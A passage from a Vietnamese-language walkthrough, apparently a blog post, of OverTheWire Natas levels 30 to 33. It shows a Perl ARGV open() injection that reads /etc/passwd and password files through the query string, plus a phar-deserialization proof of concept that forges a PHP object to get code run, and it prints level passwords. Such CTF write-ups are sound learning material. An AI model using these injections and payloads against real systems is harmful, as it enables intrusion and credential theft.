    $i=0;
    while (<$file>) {
        my @elements=split /,/, $_;

        if($i==0){ # header
            print "<tr>";
            foreach(@elements){
                print "<th>".$cgi->escapeHTML($_)."</th>";   
            }
            print "</tr>";
        }
        else{ # table content
            print "<tr>";
            foreach(@elements){
                print "<td>".$cgi->escapeHTML($_)."</td>";   
            }
            print "</tr>";
        }
        $i+=1;
    }
    print '</table>';
}
else{
print <<END;

<form action="index.pl" method="post" enctype="multipart/form-data">
    <h2> CSV2HTML</h2>
    <br>
    We all like .csv files.<br>
    But isn't a nicely rendered and sortable table much cooler?<br>
    <br>
    Select file to upload:
    <span class="btn btn-default btn-file">
        Browse <input type="file" name="file">
    </span>    
    <input type="submit" value="Upload" name="submit" class="btn">
</form> 
END
}

print <<END;
<div id="viewsource"><a href="index-source.html">View sourcecode</a></div>
</div>
</body>
</html>
END
```

Ở đây cho up một file và display ra nhưng mà lại bị escape nên mình không thể chèn script gì vô được 

![image](https://hackmd.io/_uploads/SJzJIXG01x.png)

Sau khi research thì mình thấy có thể up một file nội dung là ARGV va query một lệnh để RCE như sau https://www.blackhat.com/docs/asia-16/materials/asia-16-Rubin-The-Perl-Jam-2-The-Camel-Strikes-Back.pdf

![image](https://hackmd.io/_uploads/ryY7S4zAkg.png)

Okay thì mình thử cat /etc/passwd xem 

![image](https://hackmd.io/_uploads/HkwBSVfC1e.png)

Ngon lun bây giờ chỉ cần cat password thui /index.pl?cat%20/etc/natas_webpass/natas32%20|

![image](https://hackmd.io/_uploads/rk8drVM01g.png)

`Password: NaIWhW2VIrKqrc7aroJVHOZvk3RQMi0B`

## Natas Level 31 → Level 32

![image](https://hackmd.io/_uploads/HkocrNG0Jx.png)

Bài này giống trước nhưng mà mình thử cat password nhưng lại không được.

![image](https://hackmd.io/_uploads/H1KsPEfR1g.png)

Đến đây thì mình thử ls xem có file gì lại không và yeah có một file getpassword 

![image](https://hackmd.io/_uploads/B166w4M0yl.png)

chạy thôi và ta có flag

![image](https://hackmd.io/_uploads/H1DJu4GAkg.png)

`Password: 2v9nDlbSF7jvawaCncr5Z9kSzkmBeoCJ`

## Natas Level 32 → Level 33

![image](https://hackmd.io/_uploads/rywZu4zAkg.png)

```php
<?php
// graz XeR, the first to solve it! thanks for the feedback!
// ~morla
class Executor{
    private $filename=""; 
    private $signature='adeafbadbabec0dedabada55ba55d00d';
    private $init=False;

    function __construct(){
        $this->filename=$_POST["filename"];
        if(filesize($_FILES['uploadedfile']['tmp_name']) > 4096) {
            echo "File is too big<br>";
        }
        else {
            if(move_uploaded_file($_FILES['uploadedfile']['tmp_name'], "/natas33/upload/" . $this->filename)) {
                echo "The update has been uploaded to: /natas33/upload/$this->filename<br>";
                echo "Firmware upgrad initialised.<br>";
            }
            else{
                echo "There was an error uploading the file, please try again!<br>";
            }
        }
    }

    function __destruct(){
        // upgrade firmware at the end of this script

        // "The working directory in the script shutdown phase can be different with some SAPIs (e.g. Apache)."
        chdir("/natas33/upload/");
        if(md5_file($this->filename) == $this->signature){
            echo "Congratulations! Running firmware update: $this->filename <br>";
            passthru("php " . $this->filename);
        }
        else{
            echo "Failur! MD5sum mismatch!<br>";
        }
    }
}
?>

<h1>natas33</h1>
<div id="content">
<h2>Can you get it right?</h2>

<?php
    session_start();
    if(array_key_exists("filename", $_POST) and array_key_exists("uploadedfile",$_FILES)) {
        new Executor();
    }
?>
```

Bài này cho mình up một file và có một hàm để check md5 và nếu trùng với cái signature thì sẽ run được. Ok thì ban đầu mình nghĩ là hash collision nhưng mà payload mình chèn vào cũng sẽ được encrypt mà nhỉ ? Vậy sao có thể collision một cách chính xác được ???? (⚆ _ ⚆)

```php
if(md5_file($this->filename) == $this->signature){
    echo "Congratulations! Running firmware update: $this->filename <br>";
    passthru("php " . $this->filename);
}
```

Đến đây mình research thì mới biết có một lỗi mà mình có thể khai thác https://nhienit.wordpress.com/2020/12/12/khai-thac-lo-hong-phar-deserialize. Ok tóm tắt thì một file phar là một file có thể chứa mã nguồn php. Và trong phar có một phần là metadata dùng để truyền vào một object và phar sẽ serialize thành một file. Tiếp theo ta sẽ gọi một stream wrapper tên là  phar:// để trigger phar deserialize qua filesystem function. Nghe có vẻ hơi phức tạp nhưng ta sẽ tiến hành từng bước như sau 

### Tạo một file phar chứa object 

Ở đây source cho ta một hàm Executor và mình có thể tận dụng nó. Mình có thể biến signature thành True để bypass được hàm md5_file ezzzz. Ngoài ra để có thể chạy php thì mình cần một file php để chạy và đưa vào filename. Ok thì mình tận dụng POC trong link luôn 

```php
<?php

class Executor{
    private $filename = "hehe.php";
    private $signature = True;
    private $init = false;
}

$ser = new Executor();

$phar = new Phar("hehe.phar");
$phar->startBuffering();

$phar->addFromString('test.txt', 'text');
$phar->setStub('<?php __HALT_COMPILER(); ?>');

$phar->setMetadata($ser);
$phar->stopBuffering();

?>
```

Có một vấn đề khi chạy và mình nhận được lỗi sau 

![image](https://hackmd.io/_uploads/BJCSLgN0yl.png)

Thì đây là một cơ chế phòng thủ để chống tạo ra file phar có chứa mã độc trong metadata https://blog.programster.org/creating-phar-files#:~:text=To%20be%20able%20to%20create%20the%20phar%20file%2C%20we%20need%20to%20temporarily%20turn%20off%20the%20phar.readonly%20mode%20in%20our%20php.ini%20file.%20By%20default%2C%20phar%20files%20cannot%20be%20written%20to%20for%20security.

Khi đó ta có thể tắt nó đi để tạo file phar 

![image](https://hackmd.io/_uploads/Hy7yPlVCye.png)


### Tạo một file php để RCE 

Ok thì bước này đơn giản là tạo một file php để run nhờ hàm passthru thui 

```php
<?php echo file_get_contents('/etc/natas_webpass/natas34') ?>
```

### Upload các file

Đầu tiên mình sẽ up file phar lên

![image](https://hackmd.io/_uploads/Byvk8l4Rkx.png)

sau đó up file hehe.php

![image](https://hackmd.io/_uploads/Sy2WLlVCJx.png)

Cuối cùng gọi wrapper phar:// để tiến hành deserialize và lấy được RCE để chạy file hehe.php

![image](https://hackmd.io/_uploads/HkpMUeEC1e.png)

`Password: j4O7Q7Q5er5XFRCepmyXJaWCSIrslCJY`

## Natas Level 33 → Level 34

Và mình đã hoàn thành 34 level của natas. Quá đã luôn (｡◕‿◕｡)

![image](https://hackmd.io/_uploads/BydzPeVR1l.png)




